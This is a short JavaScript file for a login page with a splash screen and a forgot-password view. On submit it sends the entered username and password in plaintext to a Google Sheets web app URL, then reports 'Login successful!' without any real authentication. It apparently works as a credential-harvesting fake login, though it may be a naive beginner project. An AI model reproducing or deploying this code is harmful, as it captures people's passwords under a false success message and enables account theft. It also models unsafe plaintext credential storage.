const SCRIPT_URL = "PASTE_YOUR_WEB_APP_URL_HERE";

/* Show login after splash */
setTimeout(() => {
document.getElementById("loginPage").style.display = "block";
}, 3000);

/* Toggle pages */
function showForgot() {
document.getElementById("loginPage").style.display = "none";
document.getElementById("forgotPage").style.display = "block";
}

function goBack() {
document.getElementById("forgotPage").style.display = "none";
document.getElementById("loginPage").style.display = "block";
}

/* Send data to Google Sheets */
document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();

const data = {
username: this.username.value,
password: this.password.value
};

fetch(SCRIPT_URL, {
method: "POST",
body: JSON.stringify(data)
})
.then(() => {
alert("Login successful!");
this.reset();
})
.catch(() => {
alert("Error sending data");
});
});